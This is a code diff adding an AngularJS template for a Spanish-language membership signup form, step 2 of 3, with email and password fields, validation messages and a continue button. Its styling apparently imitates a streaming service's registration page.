@@ -1,0 +1,57 @@
+<div class="simpleContainer" ng-controller="RegisterController">
+    <div class="centerContainer" style="display: block; transform: none; opacity: 1; transition-duration: 250ms;">
+        <form role="form" name="registerForm" novalidate>
+            <div class="regFormContainer">
+                <div class="alert alert-warning alert-dismissible alert-oldUser" role="alert">
+                    <b>¡Usuario ya registrado!</b> Ingresa la contraseña con la que se registró.
+                </div>
+                <div class="alert alert-warning alert-dismissible alert-subscription" role="alert">
+                    <b>¡Usuario ya registrado! Tienes una membresía activa, inicia sesión.</b>
+                </div>
+                <div class="stepHeader-container" data-uia="header">
+                    <div class="stepHeader" data-a11y-focus="true" tabindex="0" style="text-align: left;"><span
+                            class="stepIndicator">PASO
+                            <b>2</b> DE <b>3</b></span>
+                        <h1 class="stepTitle" data-uia="stepTitle">Suscríbete para que comiences tu membresía</h1>
+                    </div>
+                </div>
+                <div>
+                    <div class="contextRow" data-uia="contextRowDone">¡Dos pasos más y listo!</div>
+                    <div class="contextRow" data-uia="contextRowPaperWork">Tampoco nos gustan los trámites.</div>
+                    <div class="regFormTitle" data-uia="regFormTitle">Crea tu cuenta.</div>
+                    <div class="nfInput nfInputOversize">
+                        <div class="nfInputPlacement">
+                            <input data-uia="field-email" class="nfTextField form-control" name="email" id="id_email"
+                                type="email" ng-model="email" tabindex="0" placeholder="Email" autocomplete="email"
+                                maxlength="50" minlength="5" dir="" value="" required>
+                        </div>
+                        <div ng-show="registerForm.email.$error.required && (registerForm.email.$touched || registerForm.$submitted)"
+                            class="inputError">El email es obligatorio.</div>
+                        <div ng-show="registerForm.email.$error.pattern && (registerForm.email.$touched || registerForm.$submitted)"
+                            class="inputError">Escribe una dirección de email válida.</div>
+                    </div>
+                    <div data-uia="field-password+container" class="nfInput nfInputOversize" style="margin-top: 10px;">
+                        <div class="nfInputPlacement" style="display: flex;">
+                            <input data-uia="field-password" class="form-control" name="password" class="nfTextField"
+                                id="id_password" ng-model='password' type="password" tabindex="0"
+                                placeholder="Contraseña" autocomplete="password" maxlength="62" minlength="4" ng-pattern="/^\S*$/" dir=""
+                                value="" required>
+                        </div>
+                        <div ng-show="registerForm.password.$error.required && registerForm.password.$touched"
+                            class="inputError">La contraseña es obligatoria.</div>
+                        <div ng-show="registerForm.password.$invalid && !registerForm.password.$error.required && registerForm.password.$touched"
+                            class="inputError">La contraseña debe tener entre 4 y 60 caracteres.</div>
+                    </div>
+                </div>
+            </div>
+            <div class="submitBtnContainer" style="max-width: 440px;">
+                <button id="registerButton" type="submit" autocomplete="off"
+                    class="btn btn-action" data-uia="cta-registration" placeholder="regForm_button_continue"
+                    ng-disabled="registerForm.$invalid" ng-click="newRegister()">
+                    <i class="fa fa-circle-o-notch fa-pulse fa-2x fa-fw buttonIcon" aria-hidden="true"></i>
+                    <span class="buttonText">CONTINUAR</span>
+                </button>
+            </div>
+        </form>
+    </div>
+</div>
